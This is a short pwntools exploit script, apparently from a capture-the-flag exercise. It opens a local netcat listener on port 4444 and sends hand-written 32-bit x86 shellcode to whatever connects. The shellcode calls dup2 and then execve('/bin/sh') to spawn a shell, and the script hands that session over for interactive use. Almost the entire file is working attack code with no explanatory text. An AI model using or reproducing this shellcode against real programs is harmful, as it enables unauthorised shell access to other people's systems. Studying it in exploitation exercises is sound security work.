from pwn import *
import socket

HOST = "127.0.0.1"
PORT = 65432


# with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
#     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
#     s.bind(('127.0.0.1',4444))

#     payload = b'12234123213123133312123'
#     s.listen(1)
#     conn, addr = s.accept()
#     conn.send(payload)
#     conn.close()

r = process(['nc','-l','4444']) ### need to run in wsl1 to get ip
### dup2(0,1) execve("/bin/sh")
shellcode = asm('''
    push 0x1
    pop ecx
    mov al, 0x3f
    int 0x80

    mov al, 0x0b
    xor ecx, ecx
    xor edx, edx
    push edx
    push 0x68732f2f
    push 0x6e69622f
    mov  ebx, esp
    int 0x80
    ''')

r.send(shellcode)
r.interactive()
#s.listen(5)